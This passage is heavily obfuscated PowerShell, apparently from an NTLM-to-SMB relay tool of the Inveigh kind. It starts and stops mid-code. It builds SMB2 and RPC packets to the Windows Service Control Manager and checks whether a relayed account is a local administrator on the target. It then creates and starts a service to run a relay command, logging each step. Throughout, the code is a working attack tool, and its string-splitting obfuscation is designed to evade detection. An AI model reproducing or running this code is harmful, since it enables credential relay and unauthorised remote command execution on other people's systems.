                            ${paC`ket`_S`Cm_da`TA} = &("{1}{0}{2}{4}{3}{5}{6}"-f 'ket','Get-Pac','SC','enSC','MOp','Mana','gerW') ${SMB_s`e`RVIce_by`TeS} ${smB_`seRVICe`_lE`NGTH}
                            ${s`CM_`Data} = &("{3}{4}{0}{2}{5}{9}{1}{6}{8}{7}"-f'rtF','tOrderedD','ro','Conv','e','m-','ic','ary','tion','Packe') ${pACkEt_s`cm_`d`ATA}
                            ${p`AcKE`T_rPC_dAta} = &("{0}{2}{4}{1}{3}{5}"-f 'Ge','Pack','t','et','-','RPCRequest') 0x03 ${s`cm_D`AtA}."l`enGtH" 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                            ${R`Pc_dA`Ta} = &("{0}{3}{4}{1}{5}{2}"-f 'ConvertFro','d','ctionary','m-PacketO','r','eredDi') ${PACKET`_RPC`_`d`AtA} 
                            ${pacK`e`T_`SmB2_dA`TA} = &("{0}{5}{4}{6}{2}{1}{3}" -f'Get','iteReq','r','uest','tSM','-Packe','B2W') ${S`Mb_FILe`_`ID} (${rPc_`dA`Ta}."lEN`G`Th" + ${SCm`_DaTA}."lENG`TH")
                            ${SMB`2_hE`A`DER} = &("{6}{3}{7}{0}{2}{4}{1}{5}"-f'rtFr','ction','om-PacketOrd','nv','eredDi','ary','Co','e') ${pac`Ket`_sMB2_h`Ead`er}
                            ${sm`B2_`dAta} = &("{1}{6}{4}{2}{0}{5}{3}"-f 'cke','C','-Pa','ictionary','rom','tOrderedD','onvertF') ${pA`cket_Smb`2`_`DA`Ta} 
                            ${rPC_DATa`_l`e`NGTh} = ${SmB2`_d`ATA}."L`eNgtH" + ${S`CM_D`A`Ta}."leNg`TH" + ${R`P`C_d`ATA}."L`enGth"
                            ${pack`et_`NETbIoS_SeSs`I`oN`_SER`VI`cE} = &("{4}{5}{1}{6}{8}{3}{0}{7}{2}"-f'e','PacketNe','e','sionS','G','et-','tBIO','rvic','SSes') ${SmB`2_hEaD`Er}."Le`Ngth" ${rPC_`d`At`A_Le`NgTH}
                            ${NETBi`os_`S`ESSION`_`SeRv`iCE} = &("{2}{0}{4}{5}{3}{1}{6}"-f 'onv','t','C','cketOrderedDic','er','tFrom-Pa','ionary') ${pA`CkET_`NeTbiOS`_SeS`SI`On`_sERV`icE}
                            ${s`MB`_CliEnT_se`ND} = ${n`Etb`ios`_seSSION`_SErvIce} + ${S`mB2`_H`eADeR} + ${sMb`2_DA`TA} + ${rpc`_Data} + ${sCm`_D`Ata}
                            ${S`Mb_cLIE`Nt`_str`Eam}.("{1}{0}"-f 'e','Writ').Invoke(${S`MB_ClIeNt`_`S`eNd},0,${Smb_`clIe`N`T_Send}."lEng`Th")
                            ${Smb_cLIe`N`T_s`TrEam}.("{1}{0}"-f'lush','F').Invoke()
                            ${sm`B_C`LIenT_St`Re`AM}.("{0}{1}"-f'R','ead').Invoke(${sm`B_CLi`ENT_`RE`cEIVE},0,${SmB_c`Li`En`T_ReCeIVe}."l`eNgTh")
                            ${sM`B`_`clieNT_`sTaGe} = ("{0}{2}{3}{1}" -f 'Read','t','R','eques')
                            ${sm`B_CL`I`EnT_st`AG`e_n`exT} = ("{0}{2}{1}{3}" -f'Ch','s','eckAcce','s')           
                        }

                        ("{2}{1}{0}" -f'cess','eckAc','Ch')
                        {
                            
                            if( ( &("{2}{0}{1}"-f'h','ilditem','c')  ('va'+'riABl'+'E:w2EHX') )."vAl`UE"::"TO`St`RinG"(${sM`B`_`cL`ient`_receIve}[128..131]) -eq ("{1}{0}{2}" -f'-00-0','00-00','0') -and  ( &('lS')  ('VARi'+'Abl'+'E'+':W2EHx')  )."Val`Ue"::"tO`STRing"(${sMB_`cLi`e`NT_recEI`VE}[108..127]) -ne ("{7}{10}{5}{6}{8}{3}{1}{2}{11}{12}{9}{0}{4}"-f'00-00-00-00','-','00-00-','-00','-00','-00-0','0-0','0','0-00','-00-00-00-','0-00-00','00','-00'))
                            {
                                ${iNvE`I`gh}."CoN`sole_que`UE".("{1}{0}" -f 'dd','A').Invoke(("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'is'+' '+'a '+'loca'+'l '+'administr'+'a'+'tor '+'on'+' '+"$Target"))
                                ${SmB`_`se`Rv`ice_Ma`NagEr_`con`T`ExT_`HaNdlE} = ${Sm`B_`ClIenT_ReC`eIvE}[108..127]
                                ${p`AcKeT_`s`cm_`d`ATA} = &("{2}{0}{1}{4}{3}"-f'et-Packet','S','G','teServiceW','CMCrea') ${S`Mb`_S`erVICe_`Man`Ager_CoNTEX`T_`H`A`Ndle} ${S`mB_s`erVI`c`e_B`YtES} ${s`m`B_SeRvi`ce_LeNGTh} ${PSE`xEc_`COMMANd`_byt`eS} ${PseXeC`_COMMan`d`_L`e`NgTH`_bYT`Es}
                                ${sC`M_da`TA} = &("{1}{7}{4}{2}{6}{9}{3}{8}{5}{0}" -f'ry','Co','F','cketOrdered','t','a','r','nver','Diction','om-Pa') ${pA`cKET_`s`Cm_d`ATa}

                                if(${in`Ve`Igh}."fIlE_Ou`T`PUT")
                                {
                                    ${in`VEIgh}."log_fi`LE`_qu`E`Ue".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $Target "))
                                }

                                if(${In`V`EIgH}."lOG_Ou`T`P`Ut")
                                {
                                    ${inV`E`igH}."l`oG".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $Target "))
                                }

                                if(${s`C`m_dATA}."L`engtH" -lt ${Smb_S`P`LIt_`Index})
                                {
                                    ${s`mb_CLIe`NT_sta`GE} = ("{3}{0}{2}{1}" -f'Ser','ceW','vi','Create')
                                }
                                else
                                {
                                    ${Sm`B_CLI`ENt_`S`T`AGe} = ("{0}{4}{2}{3}{1}" -f 'Crea','t','eW_Fi','rs','teServic')
                                }

                            }
                            elseif(  ( &("{0}{1}{2}"-f'Get','-ChilDIT','eM')  VariabLe:W2Ehx  )."V`ALuE"::"tOs`Tring"(${sMB_cL`iENt_re`c`EiVe}[128..131]) -eq ("{1}{2}{3}{0}"-f '0','05','-','00-00-0'))
                            {
                                ${INv`eI`gh}."cOns`ol`E_qu`EUE".("{1}{0}" -f 'dd','A').Invoke(("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'i'+'s '+'not'+' '+'a '+'lo'+'cal '+'adm'+'i'+'ni'+'st'+'rator '+'o'+'r '+'doe'+'s '+'not'+' '+'hav'+'e '+'req'+'ui'+'red '+'pr'+'ivile'+'ge '+'o'+'n '+"$Target"))
                                ${S`M`B_rElaY`_`FaILed} = ${T`RUE}

                                if(${i`Nv`eIgH}."fIlE`_`OUTpuT")
                                {
                                    ${IN`V`eigH}."lO`g_fI`Le_`Queue".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target "))
                                }

                                if(${IN`VE`IGH}."log_o`UT`put")
                                {
                                    ${INV`ei`GH}."l`OG".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target "))
                                }

                            }
                            else
                            {
                                ${sMB_rE`LAy_FA`I`LeD} = ${tr`UE}
                            }

                        }
                
                        ("{1}{0}{2}" -f't','Crea','eServiceW')
                        {
                            ${SMb2_`mEssa`Ge`_`Id} += 20
                            ${PA`ckEt_SmB2`_`he`AD`eR} = &("{1}{3}{0}{2}{4}"-f 'SM','Ge','B2','t-Packet','Header') 0x09,0x00 ${Smb2_`m`EssaGe`_iD} ${s`m`B`2_TRE`e_iD} ${SMB_`seSsi`oN`_iD}
                            ${Pac`ket_sm`B2_h`EaDEr}[("{1}{3}{4}{2}{0}" -f 'est','S','_CreditRequ','MB2Hea','der')] = 0x7f,0x00
                            ${Pac`k`Et_Rpc_d`AtA} = &("{5}{4}{2}{1}{0}{3}" -f 'e','equ','R','st','tRPC','Get-Packe') 0x03 ${SCM`_d`ATA}."lE`NGtH" 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                            ${Rpc_`d`ATa} = &("{1}{4}{5}{6}{2}{3}{0}"-f'nary','ConvertFrom','etOrderedDi','ctio','-Pa','c','k') ${pa`c`k`Et_RpC_`daTa}
                            ${p`A`ckET_sMb2`_dATa} = &("{3}{6}{1}{2}{5}{0}{4}{7}"-f 'iteRe','SMB2','W','Get-Pac','ques','r','ket','t') ${smb_FIl`E_`Id} (${R`p`C_daTA}."Le`N`GtH" + ${S`c`M_Data}."l`EnG`TH")
                            ${smB2_`he`AD`ER} = &("{0}{4}{5}{6}{3}{2}{1}" -f'Conver','y','r','edDictiona','tFrom-Pac','ketOrd','er') ${PAcKET_SMB`2`_hEA`deR}
                            ${smb2`_Da`TA} = &("{5}{9}{2}{0}{8}{7}{1}{3}{4}{6}"-f 'ketOrdere','t','om-Pac','ion','ar','Conv','y','Dic','d','ertFr') ${pac`kE`T`_smB2_d`ATA} 
                            ${R`pC`_dAta_leNGTh} = ${s`Mb2_da`TA}."LE`NgtH" + ${SCM`_DA`Ta}."LE`NGtH" + ${r`Pc_`data}."Len`gth"
                            ${packET_Netb`IoS_seS`SiO`N_sErv`I`cE} = &("{5}{0}{4}{3}{2}{1}" -f'et','nService','IOSSessio','B','Net','Get-Pack') ${sMb2_`he`AdEr}."Leng`TH" ${RP`c_datA`_Length}
                            ${NEtbi`OS_SEssiON_s`Er`Vi`CE} = &("{7}{0}{8}{5}{2}{1}{6}{3}{4}" -f'From-P','Dicti','d','a','ry','cketOrdere','on','Convert','a') ${pAc`kET`_nE`TBiOs_sEssI`On_Ser`V`ice}
                            ${sm`B_c`LiE`Nt_`SeNd} = ${NeTB`ios_SESsiO`N_Se`R`VIce} + ${smb`2_H`eADer} + ${sMb2`_D`Ata} + ${rPc_`d`ATa} + ${scm_d`ATa}
                            ${smB`_ClIe`Nt`_S`TrEAM}.("{0}{1}" -f 'Wri','te').Invoke(${S`mb_cl`Ient_S`EnD},0,${smb_`Cli`e`N`T_sEND}."le`NGtH")
                            ${s`mb_C`L`Ien`T_STREAm}.("{1}{0}" -f'h','Flus').Invoke()
                            ${SmB_`clIEnt`_`S`TReAM}.("{0}{1}"-f 'Re','ad').Invoke(${SM`B_C`LI`eNt_rECEiVE},0,${smb`_ClIEnt_`RECe`iVe}."len`GTH")
                            ${SMB_c`L`Ie`NT_STage} = ("{1}{2}{3}{0}"-f'st','R','ea','dReque')
                            ${smB`_clieNt_`sTAG`e_n`EXT} = ("{2}{3}{1}{0}" -f 'ceW','tServi','Sta','r')  
                        }

                        ("{1}{4}{2}{0}{3}"-f 'eW_F','Cre','teServic','irst','a')
                        {
                            ${SMb_SpLit`_`s`Ta`gE_`Fin`AL} =   ( &("{0}{1}{2}"-f 'VAriA','BL','e') ("jG"+"6")  )."VAl`UE"::("{1}{0}{2}"-f 'li','Cei','ng').Invoke(${ScM_D`ATa}."l`eNGTh" / ${S`mb_SPlIt_i`N`dex})
                            ${S`mB2_`M`ESS`AGE_iD} += 20
                            ${SCm`_`datA_fI`R`st} = ${Sc`m_DaTa}[0..(${Smb`_S`PLIT`_iND`Ex} - 1)]
                            ${PAC`KET`_RP`c_d`ATa} = &("{3}{2}{4}{1}{0}{5}"-f'ques','RPCRe','-P','Get','acket','t') 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${sC`m_daT`A_`FIR`sT}
                            ${pACKE`T`_`R`PC_DAta}[("{1}{3}{4}{2}{0}{5}" -f 'c','RPC','o','Re','quest_All','Hint')] =   ( &("{0}{1}" -f'i','TeM') vARIAble:W2eHx  )."vAL`Ue"::("{1}{0}" -f'es','GetByt').Invoke(${Scm`_d`AtA}."lENg`TH")
                            ${s`MB_SpL`It`_inDE`X`_tR`AcKeR} = ${sMb_`sPLiT_`I`NdEx}
                            ${RP`c`_DA`Ta} = &("{5}{0}{4}{3}{8}{2}{1}{6}{7}" -f'e','tOrderedD','-Packe','tFro','r','Conv','iction','ary','m') ${paC`KET_`RP`c_`dAtA}
                            ${P`ACKe`T`_SMb`2_HEAD`Er} = &("{4}{3}{1}{0}{2}" -f 'etSMB2Heade','ack','r','t-P','Ge') 0x09,0x00 ${sMB`2_meS`S`A`GE_`Id} ${Sm`B2_`TREE`_id} ${s`MB_sE`S`sIoN`_Id}
                            ${pa`CkET_Smb2_H`E`AdER}[("{4}{1}{2}{7}{0}{5}{6}{3}"-f 'e','e','r_','t','SMB2Head','ditR','eques','Cr')] = 0x7f,0x00
                            ${p`A`CKet_s`MB2_Data} = &("{1}{0}{4}{3}{2}{5}" -f 'etSMB','Get-Pack','eq','teR','2Wri','uest') ${Sm`B_fi`l`e_Id} ${R`p`c_datA}."le`NgTH"
                            ${smB2_h`E`A`dEr} = &("{4}{5}{2}{3}{7}{9}{8}{1}{6}{0}"-f'ry','dDic','m','-','Conv','ertFro','tiona','Packet','dere','Or') ${PA`cK`ET_`smB2_`hEa`DEr}
                            ${s`m`B2_DATA} = &("{7}{9}{6}{3}{5}{1}{8}{4}{0}{2}"-f'ar','r','y','rom-Pa','iction','cketO','F','Conve','deredD','rt') ${PA`CKET_`smb2`_`DatA} 
                            ${Rpc_d`At`A`_lenGTh} = ${sm`B`2`_DATa}."Le`NG`Th" + ${Rp`c_dA`Ta}."le`NGtH"
                            ${PaCKeT_Ne`TBIos_SESSI`on`_`seR`Vi`cE} = &("{2}{4}{7}{0}{3}{5}{6}{1}" -f'etBI','e','G','OSSessio','et-','nSer','vic','PacketN') ${s`Mb2`_`HEAdEr}."lEn`Gth" ${R`Pc_d`AtA_L`en`GTH}
                            ${n`EtbI`OS_`SEsSIOn_SEr`VicE} = &("{3}{8}{0}{4}{6}{1}{9}{5}{7}{2}" -f 'tFr','ack','nary','Co','o','ere','m-P','dDictio','nver','etOrd') ${p`Ac`K`Et_N`e`TBI`oS_SES`Si`On`_sErViCE}
                            ${S`Mb`_`c`liENT_SenD} = ${neTbIO`S`_`s`ES`SiOn_s`ervIce} + ${Smb2`_HEAd`er} + ${S`mB2_D`ATa} + ${r`pC_D`ATa}
                            ${smb_C`lIe`Nt_str`eaM}.("{1}{0}" -f'e','Writ').Invoke(${s`Mb_`cliEnt_sE`ND},0,${sm`B_C`l`i`EnT_senD}."lEnG`Th")
                            ${SM`B_CLiEnT`_`sTREaM}.("{0}{1}" -f'Fl','ush').Invoke()
                            ${SMb_cLI`E`N`T_`sTReaM}.("{1}{0}" -f'd','Rea').Invoke(${sMb`_`ClIE`Nt_RecEIVe},0,${Smb_C`Li`EnT_`ReceIVe}."lE`NGth")
                            
                            if(${s`Mb_sPl`iT_`s`TaGe_fI`NaL} -le 2)
                            {
                                ${sMb_CLIeN`T`_`stage} = ("{3}{4}{2}{1}{0}"-f 't','Las','erviceW_','Cre','ateS')
                            }
                            else
                            {
                                ${S`M`B_spLiT_sT`AGE} = 2
                                ${smB_cl`ie`Nt`_`S`TAGE} = ("{3}{5}{4}{0}{1}{2}"-f'Servic','eW_Mi','ddle','C','eate','r')
                            }

                        }

                        ("{1}{3}{0}{4}{2}"-f 'r','Create','iddle','Se','viceW_M')
                        {
                            ${s`Mb_Sp`Lit_st`AGE}++
                            ${sMb`2_`meSSa`GE_Id}++
                            ${s`cM_D`A`Ta_MIdDLE} = ${sc`m_dA`Ta}[${sMB_`sPLi`T_Inde`x_T`Ra`CKER}..(${s`MB_spLit_`in`DEX_T`RacK`er} + ${Smb_s`PLI`T_`INd`eX} - 1)]
                            ${sMb_spl`it_`INde`x_`Trac`KeR} += ${SmB_`SP`LIT_Ind`Ex}
                            ${PackET`_rpc_`DA`Ta} = &("{0}{3}{1}{2}"-f'Get','etRPCRequ','est','-Pack') 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${Scm_`DATa_`MI`Dd`lE}
                            ${PACK`eT_`R`PC_dATa}[("{3}{0}{2}{5}{4}{1}" -f 'Req','int','ue','RPC','ocH','st_All')] =  (&("{0}{1}{2}"-f 'VAr','iabL','e')  ("W2EH"+"x") -VaLUEO)::("{1}{0}"-f'tes','GetBy').Invoke(${sC`m_`d`ATA}."l`EnGTH" - ${sMB_spLIt`_INDEx_TR`A`C`Ker} + ${Smb_SP`L`It_i`NdEx})
                            ${rpc_`d`A`Ta} = &("{2}{5}{7}{3}{0}{1}{6}{4}{8}"-f '-Pack','etO','Con','m','dDictionar','v','rdere','ertFro','y') ${PAcK`ET_`R`pc_`DaTA}
                            ${pac`Ke`T`_SmB2`_hEAdeR} = &("{3}{0}{2}{4}{5}{1}" -f '-P','er','acketS','Get','M','B2Head') 0x09,0x00 ${SmB`2_M`e`SS`AgE_iD} ${S`mB2`_T`ReE_iD} ${sM`B`_S`e`SSioN_ID}
                            ${pA`cket`_sMb`2`_hEa`Der}[("{3}{0}{5}{4}{1}{2}" -f'r_Credi','eq','uest','SMB2Heade','R','t')] = 0x7f,0x00
                            ${P`AckeT`_SMb`2_data} = &("{5}{2}{3}{0}{6}{1}{4}" -f 't','WriteReq','Pac','ke','uest','Get-','SMB2') ${s`mb_fiLe_`ID} ${R`PC_`D`ATa}."l`E`NGTh"
                            ${SM`B2_hEad`eR} = &("{8}{1}{6}{10}{5}{4}{0}{7}{2}{3}{9}" -f 'redD','v','ct','ion','Orde','t','er','i','Con','ary','tFrom-Packe') ${paC`K`et`_sm`B2_hE`AdEr}
                            ${SM`B2_`d`ATa} = &("{2}{0}{8}{7}{3}{1}{5}{6}{4}"-f 'nv','cketO','Co','-Pa','ary','rderedDicti','on','om','ertFr') ${p`AC`KET_S`MB2_`data} 
                            ${rpc_DaTA`_`lE`NGTh} = ${S`M`B2_dAtA}."L`EnGtH" + ${RPC_D`ATA}."L`E`NgTH"
                            ${pac`KET_N`EtbiOs_S`e`ssIOn`_Service} = &("{4}{7}{3}{6}{2}{0}{1}{5}"-f 'Sessi','onSer','IOS','-Packet','Ge','vice','NetB','t') ${S`Mb2_`hE`ADeR}."l`e`NGTH" ${R`PC_data_`l`eNgTH}
                            ${NetBI`os_S`esSion`_seRv`icE} = &("{7}{0}{3}{6}{1}{4}{2}{5}"-f 'onvertFrom-Pack','ered','tiona','etOr','Dic','ry','d','C') ${Pa`CKet`_`NEtbioS_sES`s`IOn_seRVIcE}
                            ${sMb_`Cl`ie`NT_S`EnD} = ${NetBIOS`_`sEs`sion_S`ERvIcE} + ${Sm`B2`_h`EAder} + ${S`mB`2_DATA} + ${RP`c_dA`TA}
                            ${sM`B_`cLI`eN`T_STRe`AM}.("{1}{0}"-f'ite','Wr').Invoke(${S`M`B_`CL`iEnt_SenD},0,${SMb_`c`liENT_`sENd}."l`ENg`Th")
                            ${sMb`_`c`Lient`_S`TReAm}.("{0}{1}" -f'F','lush').Invoke()
                            ${smB_c`L`IEn`T`_StREAm}.("{0}{1}"-f'R','ead').Invoke(${s`MB_cLIe`Nt_re`CEive},0,${S`MB_CLIen`T_`R`eCEivE}."Len`GTH")

                            if(${sMB_spl`I`T_`ST`Age} -ge ${SMB_`sPlIt_Sta`GE`_fin`Al})
                            {
                                ${smb_`c`LIe`NT`_S`TAge} = ("{0}{1}{4}{3}{2}"-f'CreateSe','r','ceW_Last','i','v')
                            }
                            else
                            {
                                ${Smb`_clIent`_s`Ta`Ge} = ("{1}{0}{2}{3}"-f 'reat','C','eServiceW_Midd','le')
                            }

                        }

                        ("{4}{0}{3}{2}{1}" -f 'rvic','t','_Las','eW','CreateSe')
                        {
                            ${sMb`2`_`m`eSSagE_iD}++
                            ${SCM`_Da`TA`_l`AST} = ${SCm_D`AtA}[${s`mb_`sPlit_`INdEx`_Tr`AC`Ker}..${sc`m_dA`TA}."LEN`G`Th"]
                            ${PA`c`ket_RPC_`d`ATA} = &("{2}{1}{3}{0}"-f 'est','ketRPCR','Get-Pac','equ') 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${scm`_`Da`TA_`LAsT}
                            ${rPc_D`A`Ta} = &("{6}{0}{8}{9}{7}{2}{4}{3}{1}{5}"-f'ert','n','OrderedDict','o','i','ary','Conv','t','From-P','acke') ${P`ACket_r`P`C_dAta}
                            ${pA`ck`eT_sm`B2_He`ADer} = &("{3}{1}{0}{4}{2}"-f 'e','-Pack','MB2Header','Get','tS') 0x09,0x00 ${sMb2_`me`s`s`AgE_id} ${Smb2_T`R`E`E`_id} ${S`M`B_SeSsio`N`_Id}
                            ${pa`cke`T`_smB2_He`AD`er}[("{6}{2}{0}{4}{1}{5}{3}" -f 'ader','Cr','He','tRequest','_','edi','SMB2')] = 0x7f,0x00
                            ${pa`cK`eT_Smb2_`D`ATa} = &("{5}{1}{2}{7}{4}{0}{6}{3}" -f'eq','-PacketSMB2W','ri','t','R','Get','ues','te') ${s`mB_F`Ile_Id} ${Rp`C_`datA}."l`EngTh"
                            ${SMB`2_`HeADEr} = &("{0}{8}{3}{7}{6}{9}{1}{4}{2}{5}"-f'Conv','ed','ct','rtF','Di','ionary','ketOrde','rom-Pac','e','r') ${P`ACK`Et`_`smB`2_header}
                            ${Sm`B2`_`dATa} = &("{4}{6}{8}{7}{1}{3}{10}{0}{9}{5}{2}"-f 'ion','k','y','etOrde','Co','r','nve','-Pac','rtFrom','a','redDict') ${PaCK`Et_sMB2`_`da`Ta} 
                            ${r`p`C`_daTa_`LenGTH} = ${SM`B2_da`TA}."L`eNgTh" + ${rP`c_d`ATA}."leNG`Th"
                            ${P`AC`keT_nE`TBIO`s`_sess`IoN_sE`R`ViCe} = &("{5}{0}{6}{1}{2}{3}{4}"-f 'Packe','NetBIO','SSess','ionS','ervice','Get-','t') ${smB2`_HEAd`er}."LEN`GTH" ${rPc`_`DatA_lENGTh}
                            ${NE`Tb`Io`S_S`ES`sIon_SeRv`ice} = &("{8}{0}{10}{9}{2}{7}{5}{3}{6}{1}{4}"-f'n','tion','rom-PacketO','e','ary','r','dDic','rde','Co','ertF','v') ${pacKEt_`N`EtBIO`S_`SE`ssi`ON`_`SerVICe}
                            ${S`mB_cLI`enT_`Se`ND} = ${nETb`ios_sES`s`i`On_SEr`ViCE} + ${Smb`2_`h`eAder} + ${smB`2_D`AtA} + ${rPc_D`A`TA}
                            ${S`mB_`C`LIENT_S`T`ReaM}.("{1}{0}" -f'ite','Wr').Invoke(${Sm`B_cLI`ent`_SENd},0,${s`Mb_`CliEN`T_s`END}."LEn`GTh")
                            ${sMb_C`lieNt_`S`TR`eaM}.("{0}{1}"-f'F','lush').Invoke()
                            ${sm`B`_cliEnT_stRE`Am}.("{1}{0}"-f'd','Rea').Invoke(${SmB`_`cLiEnt`_reCEi`VE},0,${sM`B_cLiEnT`_`RE`C`EIVe}."l`ENG`Th")
                            ${sM`B_CL`IEnT_`sT`AGE} = ("{2}{0}{1}{3}" -f'Req','ue','Read','st')
                            ${s`mb_cL`iEnT_sT`Ag`E_NEXt} = ("{2}{0}{1}" -f'art','ServiceW','St')
                        }

                        ("{2}{1}{4}{0}{3}"-f 'c','Se','Start','eW','rvi')
                        {

                            if(  ${W2`E`hX}::"Tos`T`RIng"(${Smb_C`lIE`Nt_Rece`iVE}[132..135]) -eq ("{2}{1}{0}" -f'0','00-0','00-00-'))
                            {

                                if(${iNv`EI`gH}."FI`l`E_OUTP`UT")
                                {
                                    ${inv`E`iGh}."LOG_FIlE_`Q`UEue".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service created on $Target "))
                                    ${inv`E`iGH}."lOG`_F`Ile_qU`eue".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - Trying to execute SMB relay command on $Target "))
                                }

                                if(${I`NVei`gH}."Lo`g_ouTP`Ut")
                                {
                                    ${INVe`IGH}."L`og".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service created on $Target "))
                                    ${invE`iGH}."L`og".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - Trying to execute SMB relay command on $Target "))
                                }

                                ${InVe`i`Gh}."coN`SOle`_Q`UEUe".("{1}{0}"-f'dd','A').Invoke(('SM'+'B '+'r'+'elay '+'ser'+'vice'+' '+"$SMB_service "+'c'+'reated '+'on'+' '+"$Target"))
                                ${iNve`igh}."con`soLe_q`UEuE".("{0}{1}" -f 'A','dd').Invoke(('Tryi'+'ng '+'t'+'o '+'execu'+'t'+'e '+'SMB'+' '+'r'+'ela'+'y '+'c'+'omma'+'nd '+'on'+' '+"$Target"))
                                ${S`Mb_`sErVIcE_`C`OntE`x`T`_hANdLe} = ${s`M`B_CLIe`Nt_recEIvE}[112..131]
                                ${SMB2_`ME`ss`A`Ge_`ID} += 20
                                ${p`AC`Ke`T_Smb2_h`e`Ader} = &("{2}{0}{4}{1}{6}{5}{3}" -f 't','et','Ge','ader','-Pack','e','SMB2H') 0x09,0x00 ${smB2`_MeS`s`Ag`e_iD} ${S`mB2_TRe`E_`id} ${sMb_s`EsS`Ion`_ID}
                                ${Pac`KE`T`_s`MB2_head`er}[("{3}{1}{4}{0}{2}" -f'er_Cred','MB2He','itRequest','S','ad')] = 0x7f,0x00
                                ${pAc`K`et_SCm_`Data} = &("{1}{7}{8}{4}{0}{5}{3}{6}{2}" -f'tSCMS','Ge','eW','rtSer','cke','ta','vic','t','-Pa') ${smB`_serviCE_`C`ONT`eXt`_ha`ND`lE}
                                ${sCm_D`A`TA} = &("{2}{3}{5}{4}{0}{1}{6}"-f 'dDic','tion','Co','nve','rom-PacketOrdere','rtF','ary') ${PAcKeT_Sc`M_dA`Ta}
                                ${PA`cKet`_rpc_d`ATA} = &("{5}{2}{3}{6}{4}{0}{1}"-f 'que','st','e','t-Pack','e','G','etRPCR') 0x03 ${SC`M_D`ATa}."len`G`Th" 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                                ${rPc`_`Data} = &("{3}{5}{2}{0}{6}{4}{1}" -f '-PacketO','tionary','m','Conv','eredDic','ertFro','rd') ${P`ACK`ET_rpC`_dA`TA} 
                                ${paCkE`T`_`Sm`B2_`dAtA} = &("{4}{2}{3}{7}{1}{6}{0}{5}" -f'equ','B2Write','t','-Packe','Ge','est','R','tSM') ${S`mB_`F`ile_ID} (${Rpc_`daTA}."Le`NG`TH" + ${Scm`_`daTA}."lEnG`Th")
                                ${smB`2_HE`AdeR} = &("{5}{2}{6}{0}{4}{3}{1}"-f'PacketOr','nary','vertFrom','ctio','deredDi','Con','-') ${PackE`T_S`mb`2_he`A`DER}
                                ${SM`B2_d`AtA} = &("{1}{4}{5}{3}{7}{9}{0}{6}{2}{8}"-f 'd','Conver','ionar','P','tFrom','-','Dict','acketOr','y','dere') ${Pa`c`ke`T_Smb2`_d`Ata} 
                                ${RPC`_`d`ATa_LENgth} = ${Smb2_d`A`TA}."lEn`gtH" + ${sc`M_Da`TA}."Le`Ng`Th" + ${rpC_`da`Ta}."LeNg`Th"
                                ${PA`cKET_NetBi`os_se`SSi`oN`_s`eRv`iCe} = &("{3}{2}{7}{0}{4}{1}{8}{5}{6}"-f 'etNetB','i','P','Get-','IOSSess','nServ','ice','ack','o') ${SmB2_hE`A`d`er}."Le`NgTh" ${r`PC_dAtA_`lEnG`TH}
                                ${NeTBio`s_s`e`ssi`ON_SeR`VIce} = &("{3}{5}{0}{7}{1}{2}{8}{6}{4}"-f'nver','Pack','etO','C','ry','o','ona','tFrom-','rderedDicti') ${P`ACKEt`_`Net`B`IOs_`sE`SSIon_servICE}
                                ${S`Mb`_ClienT_`Se`ND} = ${N`Et`B`ioS_`SESs`Ion_s`eRVICE} + ${S`Mb2_hea`DEr} + ${SmB2`_d`A`TA} + ${RP`c`_daTa} + ${sc`M_dA`Ta}
                                ${sM`B`_`cl`ieNT_st`ReAm}.("{0}{1}"-f 'Wr','ite').Invoke(${Sm`B_`cL`iE`NT`_SeND},0,${s`Mb_`cLI`Ent`_seND}."l`ENgtH")
                                ${s`MB_cLi`eNT_S`TrEaM}.("{1}{0}"-f'ush','Fl').Invoke()
                                ${sM`B_CLien`T_`stRe`Am}.("{0}{1}" -f 'Re','ad').Invoke(${sm`B_CLIenT`_`REc`EIVE},0,${smb`_`clieNt_rECE`iVE}."LE`N`GTH")
                                ${S`MB_`CLient_sT`AGE} = ("{2}{1}{0}" -f 'Request','ad','Re')
                                ${smB_Cl`iEn`T_`ST`AgE_nExt} = ("{0}{1}{2}" -f'Del','eteService','W')     
                            }
                            elseif(  (&("{1}{0}" -f 'iR','d') ('VARIABl'+'E:W'+'2e'+'H'+'X') )."va`Lue"::"t`OSTR`ing"(${SMb_C`li`eNT_rEcEI`Ve}[132..135]) -eq ("{2}{3}{0}{1}"-f'-00','-00','31','-04'))
                            {
                                ${in`VEi`Gh}."CONSolE`_q`UEUE".("{0}{1}" -f'A','dd').Invoke(('SMB'+' '+'rela'+'y '+'s'+'ervice '+"$SMB_service "+'creat'+'i'+'on'+' '+'fail'+'e'+'d '+'on'+' '+"$Target"))
                                ${smb_re`lAy_F`A`iLED} = ${TR`UE}

                                if(${InvEI`gh}."fiLe`_oU`TPUt")
                                {
                                    ${i`N`VeigH}."lO`G_fi`le_`QuEue".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service creation failed on $Target "))
                                }

                                if(${INvei`gH}."l`Og_o`UtPUt")
                                {
                                    ${I`NvEi`gh}."l`oG".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service creation failed on $Target "))
                                }

                            }
                            else
                            {
